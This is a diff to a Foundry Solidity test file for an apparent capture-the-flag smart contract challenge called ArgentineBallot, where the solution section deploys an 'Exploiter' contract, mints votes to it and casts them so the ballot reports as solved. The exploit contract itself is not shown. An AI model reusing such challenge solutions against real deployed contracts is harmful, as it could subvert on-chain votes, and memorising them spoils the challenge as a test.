@@ -9,22 +9,19 @@ import {ArgentineBallotDeployer} from "script/rotcivegaf-argentineballot/Argenti
 import {IBallot} from "src/rotcivegaf-argentineballot/interfaces/IBallot.sol";
 import {ILaw} from "src/rotcivegaf-argentineballot/interfaces/ILaw.sol";
 
-
 /*///////////////////////////////////////////////
 // Import dependencies for your solution here! //
 //             (if you need any)               //
 ///////////////////////////////////////////////*/
-
+import {Exploiter} from "test/rotcivegaf-argentineballot/Exploiter.sol";
 
 contract BallotTest is Test, ArgentineBallotDeployer {
-
     IBallot public ballot;
 
     address player = address(420);
     address president = address(240);
 
     function setUp() public override(ArgentineBallotDeployer) {
-
         ArgentineBallotDeployer.setUp();
 
         vm.startPrank(president);
@@ -56,6 +53,11 @@ contract BallotTest is Test, ArgentineBallotDeployer {
         /*//////////////////////////////////////
         //     Write your solution here       //
         //////////////////////////////////////*/
+        // ILaw law = ballot.elections[0].laws[2];
+        Exploiter exploiter = new Exploiter(address(ballot), address(0));
+        // exploiter.electPresident();
+        ballot.mintVotes{value: 420}(address(exploiter));
+        exploiter.vote(2, 420, "");
 
         assertTrue(ballot.isSolved());
     }
